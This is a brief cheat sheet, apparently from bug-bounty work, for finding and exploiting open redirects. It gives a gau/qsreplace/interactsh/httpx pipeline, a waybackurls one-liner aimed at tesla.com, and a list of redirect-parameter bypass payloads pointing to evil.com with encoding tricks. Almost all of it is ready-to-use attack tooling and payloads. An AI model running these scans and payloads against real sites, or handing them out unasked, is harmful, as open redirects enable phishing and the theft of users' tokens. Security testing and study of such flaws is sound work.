Open redirect:
After gau, run:
cat urls.txt | grep "=" | qsreplace </my intereactsh-client> redirect.txt
run interactsh then: cat redirect.txt | httpx -fr
Check the interact-sh terminal

**echo "https://tesla.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew**

#OpenRedirect 
?redirect=https://example.com to ?redirect=https://evil.com

?redirect=//evil.com

?redirect=\\evil.com

?redirect=\https:evil.com

?redirect=example.com%40evil.com

?redirect=example.com.evil.com

?redirect=example.com%2eevil.com

?redirect=evil.com?example.com

?redirect=evil.com%23example.com

?redirect=example.com/*evil.com

?redirect=evil.com%E3%80%82example.com

?redirect=/%0d/evil.com







